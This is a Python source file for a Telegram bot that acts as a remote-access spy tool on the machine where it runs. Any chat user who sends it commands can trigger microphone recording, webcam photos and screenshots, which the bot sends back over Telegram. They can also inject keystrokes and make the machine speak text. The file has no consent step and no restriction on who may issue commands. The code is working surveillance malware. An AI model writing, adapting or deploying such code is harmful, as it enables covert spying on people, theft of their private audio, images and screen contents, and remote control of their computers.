import telebot
import pyaudio
import wave
import cv2
import mss
import os
import pyautogui
import pyttsx3

TOKEN = ''
bot = telebot.TeleBot(TOKEN)

def record_audio():
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 10
    
    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wave_output_filename = 'captured_audio.wav'
    wf = wave.open(wave_output_filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    return wave_output_filename

def capture_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('webcam_picture.jpg', frame)
    
    cap.release()
    cv2.destroyAllWindows()
    
    return 'webcam_picture.jpg'

def capture_screen():
    with mss.mss() as sct:
        sct.shot(output='screenshot.png')
    return 'screenshot.png'

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Send /record_audio to start recording audio, /capture_webcam, /capture_screen.')

@bot.message_handler(commands=['record_audio'])
def record_audio_command(message):
    try:
        audio_file = record_audio()
        if audio_file:
            with open(audio_file, 'rb') as audio:
                bot.send_audio(message.chat.id, audio)
            os.remove(audio_file)
        else:
            bot.send_message(message.chat.id, 'Error: Unable to record audio.')

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['capture_webcam'])
def capture_webcam_command(message):
    try:
        webcam_file = capture_webcam()
        if webcam_file:
            with open(webcam_file, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(webcam_file)
        else:
            bot.send_message(message.chat.id, 'Error: Unable to capture webcam picture.')

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['capture_screen'])
def capture_screen_command(message):
    try:
        screenshot_file = capture_screen()
        if screenshot_file:
            with open(screenshot_file, 'rb') as screen:
                bot.send_document(message.chat.id, screen)
            os.remove(screenshot_file)
        else:
            bot.send_message(message.chat.id, 'Error: Unable to capture screenshot.')

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['type'])
def type_text(message):
    text= message.text[6:]
    pyautogui.typewrite(text)
    bot.send_message(message.chat.id, "Command successfully conveyed.")

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "succesful say.")
        else:
            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")




if __name__ == "__main__":
    bot.infinity_polling()
